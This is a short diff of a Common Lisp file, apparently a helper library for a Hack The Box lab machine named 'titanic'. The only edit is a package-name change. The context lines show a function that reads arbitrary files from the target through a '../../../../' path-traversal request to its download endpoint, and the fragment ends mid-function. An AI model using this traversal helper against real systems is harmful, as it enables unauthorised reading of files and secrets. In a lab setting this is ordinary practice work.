@@ -1,4 +1,4 @@
-(in-package #:grimoire)
+(in-package :grimoire)
 
 (defun titanic/read-file (path)
   (let* ((url (format nil "http://titanic.htb/download?ticket=../../../../~a" path))
